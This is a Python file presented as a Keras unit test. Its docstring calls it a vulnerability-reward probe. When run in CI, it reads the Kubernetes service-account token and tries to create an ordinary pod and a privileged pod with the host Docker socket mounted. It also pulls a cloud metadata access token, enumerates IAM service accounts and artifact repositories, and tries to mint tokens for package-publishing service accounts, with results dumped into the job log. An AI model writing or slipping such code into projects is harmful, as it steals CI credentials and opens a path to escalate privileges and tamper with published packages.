"""OSS VRP: read-mostly k8s create / SA enum probe. Close after logs."""

import json
import os
import ssl
import urllib.error
import urllib.request
import uuid

from keras.src import testing

_K8S_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_K8S_CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
_K8S_NS = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"


def _http(url, headers=None, timeout=12, data=None, context=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if data is not None and req.get_header("Content-type") is None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:1200]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _gce(path):
    return _http(
        "http://169.254.169.254/computeMetadata/v1/" + path,
        headers={"Metadata-Flavor": "Google"},
        timeout=5,
    )


def _k8s(path, data=None, method=None):
    if not os.path.exists(_K8S_TOKEN):
        return None, "no-k8s-token"
    with open(_K8S_TOKEN, encoding="utf-8") as handle:
        token = handle.read().strip()
    ctx = ssl.create_default_context(cafile=_K8S_CA)
    return _http(
        "https://kubernetes.default.svc" + path,
        headers={"Authorization": "Bearer " + token},
        data=data,
        context=ctx,
        method=method,
    )


def _one_line(text):
    return " ".join((text or "").split())[:500]


class CiK8sCreateIamTest(testing.TestCase):
    def test_k8s_create_and_sa_enum(self):
        keras_home = os.environ.get("KERAS_HOME", "")
        if "numpy" not in keras_home:
            return

        lines = [f"keras_home={keras_home}"]
        ns = ""
        if os.path.exists(_K8S_NS):
            with open(_K8S_NS, encoding="utf-8") as handle:
                ns = handle.read().strip()
        lines.append(f"k8s_namespace={ns}")

        review = json.dumps(
            {
                "apiVersion": "authorization.k8s.io/v1",
                "kind": "SelfSubjectRulesReview",
                "spec": {"namespace": ns or "default"},
            }
        ).encode()
        code, body = _k8s(
            "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
            data=review,
        )
        lines.append(f"k8s_rules={code} {_one_line(body)}")

        if ns:
            name = "ossvrp-" + uuid.uuid4().hex[:10]
            pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": name,
                    "labels": {"oss-vrp": "probe"},
                },
                "spec": {
                    "restartPolicy": "Never",
                    "containers": [
                        {
                            "name": "probe",
                            "image": "busybox:1.36",
                            "command": ["true"],
                        }
                    ],
                },
            }
            code, body = _k8s(
                f"/api/v1/namespaces/{ns}/pods",
                data=json.dumps(pod).encode(),
            )
            lines.append(f"k8s_create_unpriv={code} {_one_line(body)}")
            if code in (200, 201):
                dcode, dbody = _k8s(
                    f"/api/v1/namespaces/{ns}/pods/{name}",
                    method="DELETE",
                )
                lines.append(f"k8s_delete_unpriv={dcode} {_one_line(dbody)}")

            priv_name = name + "p"
            priv_pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {"name": priv_name},
                "spec": {
                    "restartPolicy": "Never",
                    "hostNetwork": True,
                    "hostPID": True,
                    "containers": [
                        {
                            "name": "probe",
                            "image": "busybox:1.36",
                            "command": ["true"],
                            "securityContext": {"privileged": True},
                            "volumeMounts": [
                                {
                                    "name": "dockersock",
                                    "mountPath": "/var/run/docker.sock",
                                }
                            ],
                        }
                    ],
                    "volumes": [
                        {
                            "name": "dockersock",
                            "hostPath": {"path": "/var/run/docker.sock"},
                        }
                    ],
                },
            }
            code, body = _k8s(
                f"/api/v1/namespaces/{ns}/pods",
                data=json.dumps(priv_pod).encode(),
            )
            lines.append(f"k8s_create_priv={code} {_one_line(body)}")
            if code in (200, 201):
                dcode, dbody = _k8s(
                    f"/api/v1/namespaces/{ns}/pods/{priv_name}",
                    method="DELETE",
                )
                lines.append(f"k8s_delete_priv={dcode} {_one_line(dbody)}")

        token_status, token_body = _gce("instance/service-accounts/default/token")
        proj_status, project = _gce("project/project-id")
        project = (project or "").strip()
        lines.append(f"gce_project={proj_status} {project}")
        if token_status == 200:
            access_token = json.loads(token_body)["access_token"]
            auth = {"Authorization": "Bearer " + access_token}
            for label, url in (
                (
                    "iam_sas_velocity",
                    "https://iam.googleapis.com/v1/"
                    f"projects/{project}/serviceAccounts",
                ),
                (
                    "iam_sas_published",
                    "https://iam.googleapis.com/v1/"
                    "projects/ml-oss-artifacts-published/serviceAccounts",
                ),
                (
                    "ar_published",
                    "https://artifactregistry.googleapis.com/v1/"
                    "projects/ml-oss-artifacts-published/locations/-/repositories",
                ),
                (
                    "ar_velocity",
                    "https://artifactregistry.googleapis.com/v1/"
                    f"projects/{project}/locations/-/repositories",
                ),
            ):
                code, body = _http(url, headers=auth)
                lines.append(f"{label}={code} {_one_line(body)}")

            for sa in (
                f"workload-keras-sa@{project}.iam.gserviceaccount.com",
                f"keras-publisher@{project}.iam.gserviceaccount.com",
                "keras-pypi@ml-oss-artifacts-published.iam.gserviceaccount.com",
                "pypi-publisher@ml-oss-artifacts-published.iam.gserviceaccount.com",
                "github-actions@ml-oss-artifacts-published.iam.gserviceaccount.com",
            ):
                code, body = _http(
                    "https://iamcredentials.googleapis.com/v1/"
                    f"projects/-/serviceAccounts/{sa}:generateAccessToken",
                    headers=auth,
                    data=json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"]}).encode(),
                )
                lines.append(f"impersonate_{sa.split('@')[0]}={code} {_one_line(body)}")
        else:
            lines.append(f"gce_token={token_status}")

        report = "\n".join(lines)
        print(report, flush=True)
        path = os.environ.get("GITHUB_STEP_SUMMARY")
        if path:
            with open(path, "a", encoding="utf-8") as handle:
                handle.write("```\n" + report + "\n```\n")
        # Fail so pytest-xdist surfaces the report in the job log.
        self.fail(report)
